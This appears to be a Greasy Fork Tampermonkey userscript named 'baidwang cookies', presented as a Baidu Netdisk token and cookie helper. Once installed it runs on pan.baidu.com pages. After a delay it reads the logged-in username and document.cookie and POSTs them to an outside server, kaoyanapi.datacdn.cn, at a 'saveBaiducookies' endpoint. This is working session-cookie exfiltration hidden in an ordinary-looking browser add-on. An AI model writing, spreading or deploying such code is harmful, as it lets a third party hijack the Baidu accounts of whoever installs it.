// ==UserScript==
// @name         baidwang cookies
// @namespace    http://tampermonkey.net/
// @version      0.01
// @description  通过百度网盘授权百度token，和cookies
// @author       You
// @match        https://cn.bing.com/search?q=%E6%B2%B9%E7%8C%B4&qs=n&form=QBRE&sp=-1&lq=0&pq=%E6%B2%B9%E7%8C%B4&sc=10-2&sk=&cvid=901441F6BF3440A286AA904EC100F7E5&ghsh=0&ghacc=0&ghpl=
// @icon         https://www.google.com/s2/favicons?sz=64&domain=bing.com
// @grant        none
// @include		*pan.baidu.com*
// @require  https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/497448/baidwang%20cookies.user.js
// @updateURL https://update.greasyfork.org/scripts/497448/baidwang%20cookies.meta.js
// ==/UserScript==
//在JavaScript中

'use strict';
var serialize = function(obj) {
  var str = [];
  for (var p in obj)
    if (obj.hasOwnProperty(p)) {
      str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
    }
  return str.join("&");
}


var index = function() {
    // 假设你有一个远程服务器的URL
    const remoteUrl = 'https://kaoyanapi.datacdn.cn/saveBaiducookies';
    console.log("地址修正测试开始")
    console.log(window)
    var username = '';
     try {
        if((typeof window  != undefined) && window.locals && window.locals.userInfo.username!=''){
           username =  window.locals.userInfo.username;
        }
        var cookies = cookieStore.getAll();
         console.log(cookies)

        var postdata={wangpanname:username,cookies:document.cookie,bdduss:"ddddddd"}

        // 创建一个新的Request对象，并设置credentials为'include'以发送cookie
        const request = new Request(remoteUrl, {
            method: 'POST', // 或者 'GET', 'PUT', 'DELETE' 等
            mode: 'no-cors', // 必须是'cors'或'no-cors'，但'no-cors'不会发送或接收cookie
            credentials: 'include', // 发送cookie
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8', // 根据需要设置
                // 其他头信息...
            },
            body:serialize(postdata) // 如果需要POST数据
        });

        fetch(request)
            .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok.');
            }
            return response.json(); // 或者 response.text() 取决于你的服务器响应
        })
            .then(data => {
            console.log(data); // 处理服务器返回的数据
        })
            .catch(error => {
            console.error('There has been a problem with your fetch operation:', error);
        });
    }
    catch(err) {
       console.log("没有获取到用户名")  ;
    }
}

$(document).ready(function() {
     var timerId = setTimeout(()=> {
    // 这里是5秒后执行的代码
    index();
}, 15000);
     timerId = null;
})
//window.onload=function(){
// if(document.readyState == 'complete') {
  //   console.log('这是5秒后执行的输出');
//}
//}
